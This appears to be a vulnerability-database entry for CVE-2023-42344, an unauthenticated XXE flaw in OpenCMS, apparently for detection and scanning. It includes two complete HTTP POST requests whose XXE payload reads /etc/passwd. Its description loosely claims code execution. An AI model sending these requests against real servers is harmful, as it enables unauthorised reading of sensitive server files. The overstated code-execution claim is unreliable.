---
layout: post
cve_id: CVE-2023-42344
title: OpenCMS - XML external entity (XXE)
pcap: true
pcap_path: /pcaps/2023/CVE-2023-42344.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-42344.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0xr2r
severity: high
impact: 'Unauthenticated attackers can exploit XXE vulnerabilities to execute malicious
  requests on the OpenCMS server, potentially reading sensitive server files and internal
  data.

  '
remediation: Advised to upgrade to OpenCMS 10.5.1 or later to patch the vulnerability
reference:
- https://blog.qualys.com/product-tech/2023/12/08/opencms-unauthenticated-xxe-vulnerability-cve-2023-42344
- https://labs.watchtowr.com/xxe-you-can-depend-on-me-opencms/
classification:
  cpe: cpe:2.3:a:alkacon:opencms:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: alkacon
  product: opencms
  fofa-query: OpenCms-9.5.3
tags:
- cve
- cve2023
- xxe
- opencms
- vkev
- vuln
---

## üîç Vulnerability Description
users can execute code without authentication.  An attacker can execute malicious requests on the OpenCms server. When the requests are successful vulnerable OpenCms can be exploited resulting in an unauthenticated XXE vulnerability. Based on research OpenCMS versions from 9.0.0 to 10.5.0 are vulnerable.


## üåê HTTP Request
```nohighlight
POST /opencms/cmisatom/cmis-online/query HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:104.0) Gecko/20100101 Firefox/104.0
Connection: close
Content-Length: 528
Accept: */*
Accept-Language: en
Content-Type: application/xml;charset=UTF-8
Referer: /
Accept-Encoding: gzip

<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><cmis:query xmlns:cmis="<http://docs.oasis-open.org/ns/cmis/core/200908/>"><cmis:statement>&test;</cmis:statement><cmis:searchAllVersions>false</cmis:searchAllVersions><cmis:includeAllowableActions>false</cmis:includeAllowableActions><cmis:includeRelationships>none</cmis:includeRelationships><cmis:renditionFilter>cmis:none</cmis:renditionFilter><cmis:maxItems>100</cmis:maxItems><cmis:skipCount>0</cmis:skipCount></cmis:query>
```

```nohighlight
POST /cmisatom/cmis-online/query HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Connection: close
Content-Length: 528
Accept: */*
Accept-Language: en
Content-Type: application/xml;charset=UTF-8
Referer: /
Accept-Encoding: gzip

<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><cmis:query xmlns:cmis="<http://docs.oasis-open.org/ns/cmis/core/200908/>"><cmis:statement>&test;</cmis:statement><cmis:searchAllVersions>false</cmis:searchAllVersions><cmis:includeAllowableActions>false</cmis:includeAllowableActions><cmis:includeRelationships>none</cmis:includeRelationships><cmis:renditionFilter>cmis:none</cmis:renditionFilter><cmis:maxItems>100</cmis:maxItems><cmis:skipCount>0</cmis:skipCount></cmis:query>
```

